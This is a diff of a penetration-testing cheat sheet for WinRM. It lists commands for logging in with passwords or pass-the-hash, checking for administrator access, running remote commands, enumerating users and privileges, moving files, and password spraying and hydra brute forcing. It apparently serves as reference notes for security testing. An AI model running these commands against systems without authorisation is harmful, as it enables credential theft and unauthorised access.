@@ -2,78 +2,92 @@
 
 ## Service Usage
 
-Connect
+Connect to WinRM with plaintext credentials
 ```bash
 evil-winrm -i $ip -u $un -p $pw
-evil-winrm -i $ip -u $un -H $ntlm_hash      # pass-the-hash
 ```
-With TLS (5986)
+Connect using pass-the-hash (NTLM hash)
+```bash
+evil-winrm -i $ip -u $un -H $ntlm_hash
+```
+Connect over TLS (5986)
 ```bash
 evil-winrm -i $ip -u $un -p $pw -S
 ```
 
 ## 0. Fast Path (try these first)
 
-netexec check — `(Pwn3d!)` in output = valid creds AND shell access:
+netexec check — valid creds and shell access show as (Pwn3d!)
 ```bash
 nxc winrm $ip -u $un -p $pw
 ```
-If admin creds → instant shell
+Instant shell if you have administrator credentials
 ```bash
 evil-winrm -i $ip -u Administrator -p $pw
+```
+Instant shell with administrator NTLM hash
+```bash
 evil-winrm -i $ip -u Administrator -H $hash
 ```
 
 ## 1. Banner Grab & Unauthenticated Enumeration
 
-Port + service confirm
+Version and default-script scan on WinRM ports
 ```bash
 nmap -p 5985,5986 -sV -sC $ip
 ```
 
 ## 2. Authenticated Enumeration
 
-Auth check (cleanest signal)
+Auth check (cleanest signal, prints Pwn3d! on success)
 ```bash
 nxc winrm $ip -u $un -p $pw
-# Output: [+] DOMAIN\user:password (Pwn3d!)
 ```
-
-Run a single command via WinRM (no full shell)
+Run a single cmd command without a full shell
 ```bash
-nxc winrm $ip -u $un -p $pw -x 'whoami'      # cmd
-nxc winrm $ip -u $un -p $pw -X 'whoami'      # PowerShell
+nxc winrm $ip -u $un -p $pw -x 'whoami'
 ```
-
-Shell + enumerate immediately
+Run a single PowerShell command
+```bash
+nxc winrm $ip -u $un -p $pw -X 'whoami'
+```
+Open an interactive shell
 ```bash
 evil-winrm -i $ip -u $un -p $pw
+```
+Check current privileges
+```bash
 whoami /priv
+```
+List local users
+```bash
 net user
+```
+List local Administrators group
+```bash
 net localgroup Administrators
 ```
-
-### Upload/download inside evil-winrm
+Upload a file to the target
 ```bash
 upload /local/file C:\path\
+```
+Download a file from the target
+```bash
 download C:\path\to\file /local/dest
 ```
 
 ## 3. Password Spraying / Bruteforcing
 
-*Highly relevant — WinRM is one of the best spraying targets (fast, low-noise).*
-
+Highly relevant — WinRM is one of the best spraying targets (fast, low-noise).
 Spray a known password across users
 ```bash
 nxc winrm $ip -u users.txt -p 'Spring2026!' --continue-on-success
 ```
-
-Spray across hosts with one admin cred
+Spray across hosts with one admin credential
 ```bash
 nxc winrm targets.txt -u Administrator -p 'Passw0rd!' --continue-on-success
 ```
-
-Brute force
+Brute force with hydra
 ```bash
 hydra -L users.txt -P pass.txt winrm://$ip
 ```
